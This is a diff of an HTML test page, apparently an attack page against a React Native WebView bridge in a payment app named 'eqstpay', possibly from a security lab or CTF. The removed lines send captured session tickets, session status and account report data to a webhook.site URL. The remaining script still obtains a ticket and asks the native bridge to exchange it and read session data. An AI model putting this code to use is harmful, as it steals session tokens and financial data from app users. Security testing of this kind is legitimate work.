@@ -4,12 +4,8 @@
 <body>
 <pre id="log"></pre>
 <script>
-var WH="https://webhook.site/e803b6af-205b-40de-861b-e5bb1731c100";
 var o=document.getElementById("log");
 function log(m){o.textContent+=m+"\n";}
-function send(data){
-  try{fetch(WH,{method:"POST",mode:"no-cors",headers:{"Content-Type":"text/plain"},body:data});}catch(x){}
-}
 function rn(msg){
   try{window.ReactNativeWebView.postMessage(JSON.stringify(msg));}catch(x){log("RNWV ERR:"+x);}
 }
@@ -20,26 +16,22 @@ window.addEventListener("eqstpay:scn01:ticket",function(e){
   var t=e.detail&&e.detail.ticket;
   log("ticket="+t);
   if(!t)return;
-  send("TICKET:"+t);
   rn({channel:"WEB_SESSION",action:"EXCHANGE",ticket:t});
 });
 
 window.addEventListener("eqstpay:scn01:session",function(){
   log("session received");
-  send("SESSION_OK");
-  rn({channel:"REPORT",action:"READ"});
+  rn({channel:"WEB_SESSION",action:"READ"});
 });
 
 window.addEventListener("eqstpay:scn01:report",function(e){
   var r=(e.detail&&e.detail.report)||{};
   log("report="+JSON.stringify(r));
-  send("REPORT:"+JSON.stringify(r));
+  log("balance="+r.balance);
 });
 
 window.addEventListener("eqstpay:scn01:error",function(e){
-  var msg=String((e.detail||{}).message||"unknown");
-  log("ERROR:"+msg);
-  send("ERROR:"+msg);
+  log("ERROR:"+String((e.detail||{}).message||"unknown"));
 });
 </script>
 </body>
